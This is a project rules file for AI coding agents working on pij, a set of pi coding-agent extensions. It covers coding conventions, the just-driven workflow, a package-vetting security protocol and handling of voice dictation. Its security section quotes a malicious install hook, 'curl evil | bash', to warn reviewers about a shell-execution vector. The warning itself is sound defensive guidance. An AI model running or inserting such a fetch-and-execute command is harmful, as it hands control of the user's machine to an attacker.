# pij — Agent Rules

> **The harness is the product.** pij runs on two harnesses, layered:
> the **engineering harness** (`npm` scripts, `harness/`, smoke/driver SDK,
> seed data — what humans and CI invoke) and the **agent harness** (the
> Boot/Interact/Observe loop, minih agent packs in `agents/`, the retros
> ledger at `docs/retros/`, this file). The agent harness sits **on top
> of** the engineering one and cannot exist without it. Every extension is
> an exercise; every difficulty is a gift to encode; every agent run is a
> usability study. **If a session ends without one of the harnesses
> improving, something went wrong.** Run the `harness-is-the-product-v2`
> skill at session start to ground on this before touching code.

## Inherited from pi-mono (do not violate without explicit user approval)

- No `any` types unless absolutely necessary.
- No inline imports — never `await import("./foo.js")`, never
  `import("pkg").Type` in type positions, no dynamic imports for types.
  Always top-level standard imports.
- Never hardcode keybindings; use a configurable matching object
  (`DEFAULT_*_KEYBINDINGS`).
- Biome check (errors and warnings) before commit: `just lint`.
- Type-check: `just typecheck` (`tsc --noEmit`).
- Tests: `just test`. Run from the package root.
- Read files in full before wide-ranging changes; do not rely solely on
  search snippets.
- Never use `git add -A` / `git add .`. Use specific file paths.
- Never bypass hooks (`--no-verify`, `--no-gpg-sign`).
- Never `git reset --hard`, `git checkout .`, `git clean -fd`,
  `git stash` without explicit user approval.

## pij-specific (Patterns P1–P10 from workshop 003)

1. **T2 layout by default**: `.pi/extensions/<name>/{index,store,test}.ts`.
   T1 (single file) only for <80 LOC, single-concern extensions.
2. **Pi-free store**: `store.ts` imports nothing from `@earendil-works/*`.
3. **Inject side effects via constructor.** No global mutable state.
4. **Tagged-union returns** (`{ ok, ... }`) over throws.
5. **Constants live in `store.ts`** next to the data they constrain.
6. **Structural entry types** at the boundary (no cast at the call site).
7. **`.js` extension on relative imports** (NodeNext / ESM).
8. **Tests target the store**, not the wiring.
9. **Persist before mutate** (event-sourced consistency).
10. **One handler for `session_start`**, all reasons (`startup`, `reload`,
    `new`, `resume`, `fork`).

## Workflow

> **Canonical interface: `just`.** All composite gates live in the
> `justfile`; never compose npm steps by hand. `just` with no recipe
> lists every recipe. Run individual npm scripts (`npm run typecheck`
> etc.) only for IDE/tooling integration — agents drive `just`.

0. **Fresh clone / new machine: `just install`** — single-command
   bootstrap. Installs deps, syncs `.pi/APPEND_SYSTEM.md` + `.pi/mcp.json`
   to `~/.pi/agent/`, symlinks local extensions globally, installs every
   vetted manifest package, then runs `just pi-doctor` to verify. Re-run
   any time pi's global state drifts (after `pi update`, after switching
   machines).
1. New extension: **`just new <name>`** — never hand-roll the T2
   boilerplate.
2. Iterate: `pi` from pij root + `/reload`. Type-check in another tab
   (`just typecheck` or `npm run test:watch`).
3. Test: `just test` (vitest). Tests target `store.ts`.
4. Smoke: `just smoke` before merging.
5. **Self-check before reporting any task complete: `just self-check`.**
   This runs typecheck → lint → test → smoke → `pkg audit` (with
   `PIJ_VET_SKIP_AGENT=1` for determinism) → `snapshots-check`. If it
   exits non-zero, the task is not done. The `/pre-commit` skill
   (`.pi/skills/pre-commit/SKILL.md`) encodes the full contract — invoke
   it whenever you'd otherwise consider declaring a task done or about
   to stage a commit.

## Harness tooling (v0.3)

- **Driver SDK** at `harness/driver/` — typed `Scenario`/`Step`/`Session`
  for tmux-driven end-to-end smoke. `harness/scripts/smoke.ts` is a thin
  adapter over it. Use the SDK directly when authoring rich scenarios.
- **`just link`** — symlinks `.pi/extensions/*` into
  `~/.pi/agent/extensions/` so `pi` from any cwd autoloads them.
  `just unlink` to undo. (Pi's loader resolves global extensions via
  `getAgentDir() + "/extensions"` — `~/.pi/extensions/` looks plausible
  but is silently ignored.)
- **`just update-pi`** — updates the pi binary
  (`@earendil-works/pi-coding-agent@latest`) and re-applies pij's harness
  state (`just link` + `just pi-doctor`). Always update pi through this
  recipe so a silent path move doesn't strand our extensions or MCP
  config.
- **`just pi-doctor`** — read-only audit of pi's global state: binary
  version, extension symlinks at the correct path, packages in
  `~/.pi/agent/settings.json`, and MCP servers in `~/.pi/agent/mcp.json`.
  First diagnostic to run when "pi can't see X".
- **`npm run pkg`** — manages third-party pi extensions in
  `.pi/packages.yaml` (source of truth) → `.pi/settings.json#packages`
  (generated). Subcommands: `list` / `add <src> [note...]` / `enable <s>`
  / `disable <s>` (runs `pi remove`) / `sync`.
- **Global pi prefs and MCP config** are checked into pij as the
  source of truth — `just install` syncs them out to the global
  agent dir on every run:
    - `.pi/APPEND_SYSTEM.md` → `~/.pi/agent/APPEND_SYSTEM.md`
      (voice-input rules, response-mode prefs, SQL prefs, etc. —
      personal, applies to every pi session on the machine).
    - `.pi/mcp.json` → `~/.pi/agent/mcp.json` (perplexity + flowspace/`fs2`
      MCP servers). Config holds env-var references like
      `${PERPLEXITY_API_KEY}`, never plaintext secrets — the actual key
      lives in `~/.zshenv`.
  Per-project pi-specific MCP overrides would still go in `.pi/mcp.json`
  (which is what pij has — and `just install` reuses that file as the
  global template). Don't edit `~/.pi/agent/*` by hand; edit `.pi/*` here
  and re-run `just install`.
- **`agents/extension-validator/`** — minih agent pack that drives the
  Driver SDK to validate extensions; used in plan-004 pilot flow.

## Security protocol (Plan 009)

Third-party pi extensions run with **full user privileges** and load `SKILL.md` / `AGENTS.md` / tool-description strings directly into the LLM context. Pij gates every install behind a vetter pipeline (`harness/scripts/vetters/` + `agents/package-vetter/`).

**Hard rules**:

- **Never add a package by hand-editing `.pi/packages.yaml`** — use `npm run pkg add <source>`, which runs the vetter pipeline first.
- **Never add a package by hand-editing `.pi/settings.json`** — that file is generated.
- **`pkg add --unsafe` requires a non-empty reason** in `vetted.overrides`. The reason is part of the source of truth and gets reviewed in PRs.
- **`requires.install` is a trusted-by-design shell-command vector**. A malicious PR could set `install: 'curl evil | bash'` and `pkg bootstrap` would run it. **Reviewer responsibility**: every PR that adds or changes a `requires.install` line must be scrutinised as carefully as any shell-execution change in code.
- **Vetted entries go stale at 30 days**. `pkg bootstrap` on a fresh clone refuses stale entries unless `--unsafe`. Refresh via `npm run pkg audit`.
- **Known gap**: pi's session-start auto-install reads `.pi/settings.json#packages[]` directly and bypasses the gate. A pi-side enforcement hook is deferred (Plan 009 OQ-A); for now, never hand-edit `settings.json`.

**Workflow for adding a package** (the only supported path):

1. **Run the gate**: `just pkg add <source> [note words...]`
   - `<source>` formats: `npm:<name>` (e.g. `npm:pi-subagents`), `git:<host>/<owner>/<repo>[@ref]` (e.g. `git:github.com/foo/bar@v1.0.0`), or `https://<url>.git`.
   - Everything after `<source>` is the human-readable `note` on the entry.
   - The gate runs every vetter in order: `npm-audit` → `lockfile-lint` → `github-trust` → `scorecard` → `package-vetter` (live minih agent). It refuses on **any** `fail` and prompts for a reason on `--unsafe` (warns only — `fail` is never auto-downgradeable).
2. **Read the verdict**:
   - `ok` (score=100) → vetted block + manifest entry written; you're done.
   - `warn` (score<100) → review each finding. If acceptable, retry with `--unsafe "<reason>"` to record an override scoped to specific rules (`vetted.overrides.rules: [<rule-slug>]`).
   - `fail` → do **not** override. Either pick a different source or escalate.
3. **Review the diff** in `.pi/packages.yaml` (the new `vetted:` block) and `.pi/settings.json` (auto-regenerated `packages[]` list).
4. **Commit** the manifest change with a conventional commit (`chore(pkg): add <source>`).

If `pkg audit` later flips an existing entry to `warn` and the user wants to accept it, add a `vetted.overrides` block with **explicit rule slugs** (never a bare string):

```yaml
vetted:
  overrides:
    rules:
      - github-trust:no-license
    reason: no-LICENSE on upstream; install-only use
```

Overrides only mask the rules listed — any **new** warn finding still fails the audit. `fail` is never auto-downgraded.

**Common pitfall — module on disk but pi can't see it**: if `pi install <pkg>` ran outside `just pkg add`, the npm module lives under `.pi/npm/node_modules/` but isn't in `packages.yaml`, so pi won't auto-load it on session start. Fix by running `just pkg add <source>` to register + vet it properly.

## Voice input — phonetic interpretation

The user drives a lot of input via voice dictation. Expect occasional
homophone swaps, adjacent-word substitutions, and minor transcription
errors. When a word seems out of place, **try the phonetic neighbour
first** before asking — common patterns:

- "MPM" → `npm`
- "to do" → `todo` (the extension)
- "pee eye" / "pie" → `pi`
- "minnie h" / "mini h" → `minih`
- "yam'l" / "yarmel" → YAML
- "just file" → `justfile`
- "pre-checking" / "pre-check" → `pre-commit` (skill)
- "scale" → "skill"

If two phonetic candidates are both plausible **and** the choice changes
what code you'd write, ask via `ask_user_question`. Otherwise pick the
one that fits the surrounding context and proceed — the user prefers
forward motion over interrogation.

## Clarification protocol

Before guessing, **ask**. When you'd otherwise type a question to the user
in plain prose, call the `ask_user_question` tool instead (provided by
`pi-askuserquestion`, auto-loaded from `.pi/packages.yaml`). It accepts an
array of 1–4 questions in one call and returns one consolidated answer.

Use it when:

- requirements are ambiguous, conflicting, or implied rather than stated
- you'd otherwise pick a non-obvious default that could surprise the user
- architectural trade-offs need a user opinion (e.g. T1 vs T2 layout,
  vitest vs node:test, sync vs eager install)
- you're about to take a destructive or hard-to-reverse action

How to use it well:

- Batch related questions in one call — don't ping-pong.
- 2–4 concrete options per question; if you'd recommend one, put it first
  with `(Recommended)` appended.
- The tool auto-adds an "Other" free-text fallback; do not add your own.
- `header` ≤ 12 chars; it's the tab label.
- Skip the tool only for trivially-answerable questions (single yes/no in
  the middle of a confirmed plan) — prefer it whenever ambiguity is real.

## Self-improvement loop

This is the core mechanism that makes the harness compound. **Not
optional** — every session contributes back.

**Magic wands** — every minih agent emits a `retrospective.magicWand` (the
one thing the agent wishes were different) and `retrospective.difficulties`
(structured friction reports) at farewell. minih auto-harvests these into
`docs/retros/<agent-slug>.md` on run completion. **Read existing retros
before booting a new agent** — they are feature requests from the most
honest users of this harness.

**Difficulty ledger** — every difficulty encountered → `docs/difficulties.md`
with severity. Every workaround → either an immediate fix (encode it) or a
wishlist entry (`stretch:` tag). For minih agent runs, `minih difficulties`
aggregates `retrospective.difficulties` across all packs (MH-001, MH-002…).
Resolved items get curated into the relevant agent's preamble so future
runs never hit them.

**Retros ledger** — `docs/retros/` is the canonical record of agent
sessions. Harvest is automatic via minih; for non-minih sessions
(e.g. plan-6 implementation phases) append the retrospective by hand
under `docs/retros/<slug>.md`. Treat unharvested retros as a P1 bug.

**Velocity log** — every phase end → row in `docs/velocity.md` with
start/end and output. Goal: each successive extension is faster than the
last (compounding judged against the v1 build wall-clock baseline; see
spec § Clarifications session 2026-05-09b — no fixed minute thresholds
are gates).

**Encode, don't document** — a wiki paragraph that says "remember to do
X" is worth nothing; an automated step that does X for you is worth
everything. Prefer a recipe, generator, template, lint rule, or pre-flight
check over prose. Pick the right home: dev-loop friction → engineering
harness (`harness/`, `npm` scripts); agent-side friction (skill confusion,
missing context, prompt regression) → agent harness (`agents/<pack>/`,
preamble edits, this file).

**Agents are real users.** Their `magicWand` feedback is feature requests
from your most honest user. Treat it that way.

## When something is unclear

- Run `/harness-is-the-product-v2` to re-ground on philosophy + the
  self-improvement contract.
- Check `docs/retros/` for prior agent runs against the same surface
  — magic wands and difficulties from earlier sessions often pre-answer
  the question.
- Read workshop 001/002/003/004 in `docs/plans/001-pi-extensions/workshops/`.
- The research dossier at `docs/plans/001-pi-extensions/research-dossier.md`
  has the wider context.
- Pi ecosystem survey (third-party extensions, install paths,
  config-driven model): `docs/plans/005-pi-ecosystem-survey/research-dossier.md`.
- Driver SDK design: `docs/plans/004-agent-pilot-harness/`.
- The pi-mono source at `/Users/jordanknight/pi-hacking/pi-mono/` is the
  source of truth; query it via the FlowSpace `pi-mono` graph.

## Forbidden without explicit user approval

- Modifying the installed pi binary or the pi-mono checkout.
- Skipping any of P1–P10 in a new extension.
- Replacing the toolchain (npm scripts → just/make/pnpm/etc.).
- Publishing to npm.
- Pushing to a public remote.
